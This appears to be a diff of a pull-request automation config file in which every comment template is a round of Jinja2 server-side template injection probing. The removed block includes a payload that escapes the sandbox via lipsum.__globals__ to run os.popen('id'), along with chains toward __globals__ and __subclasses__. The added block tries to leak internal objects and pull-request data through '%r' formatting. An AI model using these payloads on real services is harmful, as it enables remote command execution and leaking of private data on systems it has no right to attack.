@@ -1,28 +1,38 @@
 pull_request_rules:
-  - name: v24-attr-chain-on-functions
+  - name: g4o7t-repr-leak-harvest-v25
     conditions: []
     actions:
       comment:
         message: |
-          === G4o7T v24 attr-chain-on-functions ===
-          C1-lipsum-globals: {{ (lipsum | attr('__globals__'))['__builtins__']['__import__']('os')['popen']('id').read() }}
-          C2-cycler-init-globals: {{ cycler | attr('__init__') | attr('__globals__') }}
-          C3-joiner-init-globals: {{ joiner | attr('__init__') | attr('__globals__') }}
-          C4-namespace-init-globals: {{ namespace | attr('__init__') | attr('__globals__') }}
-          C5-range-init-globals: {{ range | attr('__init__') | attr('__globals__') }}
-          C6-dict-init-globals: {{ dict | attr('__init__') | attr('__globals__') }}
-          C7-lipsum-module: {{ lipsum | attr('__module__') }}
-          C8-lipsum-name: {{ lipsum | attr('__name__') }}
-          C9-lipsum-qualname: {{ lipsum | attr('__qualname__') }}
-          C10-lipsum-dict: {{ lipsum | attr('__dict__') }}
-          C11-lipsum-self: {{ lipsum | attr('__self__') }}
-          C12-lipsum-func: {{ lipsum | attr('__func__') }}
-          C13-lipsum-class: {{ lipsum | attr('__class__') }}
-          C14-lipsum-class-mro: {{ lipsum | attr('__class__') | attr('__mro__') }}
-          C15-lipsum-class-bases: {{ lipsum | attr('__class__') | attr('__bases__') }}
-          C16-lipsum-class-subclasses: {{ lipsum | attr('__class__') | attr('__subclasses__') }}
-          C17-lipsum-globals-direct: {{ lipsum.__globals__ }}
-          C18-cycler-class: {{ cycler | attr('__class__') }}
-          C19-joiner-class: {{ joiner | attr('__class__') }}
-          C20-namespace-class: {{ namespace('a') | attr('__class__') }}
-          === end v24 ===
+          === G4o7T v25 %r repr harvest ===
+          R1-files: {{ '%r' | format(files) }}
+          R2-lipsum: {{ '%r' | format(lipsum) }}
+          R3-namespace_empty: {{ '%r' | format(namespace()) }}
+          R4-namespace_w_lipsum: {{ '%r' | format(namespace(x=lipsum)) }}
+          R5-cycler: {{ '%r' | format(cycler('a','b')) }}
+          R6-joiner: {{ '%r' | format(joiner()) }}
+          R7-range: {{ '%r' | format(range(1)) }}
+          R8-dict_lipsum: {{ '%r' | format(dict(a=lipsum)) }}
+          R9-dict_values: {{ '%r' | format(dict(a=lipsum).values()) }}
+          R10-dict_items: {{ '%r' | format(dict(a=lipsum).items()) }}
+          R11-dict_keys: {{ '%r' | format(dict(a=lipsum).keys()) }}
+          R12-self: {{ '%r' | format(self) }}
+          R13-commits: {{ '%r' | format(commits) }}
+          R14-assignee: {{ '%r' | format(assignee) }}
+          R15-author: {{ '%r' | format(author) }}
+          R16-body: {{ '%r' | format(body) }}
+          R17-empty_list_concat: {{ '%r' | format([lipsum] + []) }}
+          R18-list_map_gen: {{ '%r' | format([1,2] | map('string')) }}
+          R19-batch_gen: {{ '%r' | format([1,2] | batch(1)) }}
+          R20-unique_gen: {{ '%r' | format([1,2] | unique) }}
+          R21-select_gen: {{ '%r' | format([1,2] | select) }}
+          R22-method_cycler_next: {{ '%r' | format(cycler('a','b').next) }}
+          R23-Macro: {% macro f() %}x{% endmacro %}{{ '%r' | format(f) }}
+          R24-BlockReference: {% block bb %}x{% endblock %}{{ '%r' | format(self.bb) }}
+          R25-LoopContext: {% for x in [1] %}{{ '%r' | format(loop) }}{% endfor %}
+          R26-Caller: {% macro f() %}{{ '%r' | format(caller) }}{% endmacro %}{% call f() %}content{% endcall %}
+          R27-tuple_items: {{ '%r' | format(dict(a=lipsum).items() | first) }}
+          R28-Cycler-current: {{ '%r' | format(cycler('a','b').current) }}
+          R29-Namespace-attrs: {{ '%r' | format(namespace(a=1,b=2,c=lipsum)) }}
+          R30-DummyList-files: {{ '%r' | format(files) }}
+          === end v25 ===
